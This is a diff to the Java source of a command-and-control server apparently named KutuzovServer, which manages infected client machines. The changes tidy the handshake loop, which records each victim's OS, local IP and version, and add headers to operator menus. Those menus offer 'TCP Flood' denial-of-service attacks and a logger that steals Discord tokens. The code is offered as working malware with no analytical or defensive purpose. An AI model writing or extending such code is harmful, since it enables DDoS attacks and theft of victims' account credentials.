@@ -108,20 +108,22 @@ public class KutuzovServer {
                     continue;
                 }
 
-                    Client client = null;
-                    try {
-                        client = clientManager.newClient(clientSocket);
-                        client.sendPacket(new SCRequireHandshakePacket());
-                        CSHandshakePacket handshakePacket = (CSHandshakePacket)client.readPacket();
-                        client.setIdentifierName(handshakePacket.identifierName);
-                        client.setOs(handshakePacket.os);
-                        client.setLocalIp(handshakePacket.localIp);
-                        client.setVersion(handshakePacket.version);
-                        client.setMC(handshakePacket.isMC);
+                Client client = null;
+                try {
+                    client = clientManager.newClient(clientSocket);
+                    if(!client.valid)
+                        continue;
+                    client.sendPacket(new SCRequireHandshakePacket());
+                    CSHandshakePacket handshakePacket = (CSHandshakePacket)client.readPacket();
+                    client.setIdentifierName(handshakePacket.identifierName);
+                    client.setOs(handshakePacket.os);
+                    client.setLocalIp(handshakePacket.localIp);
+                    client.setVersion(handshakePacket.version);
+                    client.setMC(handshakePacket.isMC);
                     /*} catch (IOException e) {
                         pnl("Could not request handshake from client(" + client.getIp() + ")!");*/
-                    } catch (Exception ignored) {}
-                }});
+                } catch (Exception ignored) {}
+            }});
             //}
         thread.start();
 
@@ -294,6 +296,7 @@ public class KutuzovServer {
 
     private void user_list_client_dos_options(Client client) {
         clearConsole();
+        user_list_header(client);
         pnl("Client DOS options:");
         pnl("  0) Back");
         pnl("  1) TCP Flood");
@@ -340,6 +343,7 @@ public class KutuzovServer {
 
     private void user_list_client_logger(Client client) {
         clearConsole();
+        user_list_header(client);
         pnl("Client Logger Options:");
         pnl("  0) Back");
         pnl("  1) Discord Token");
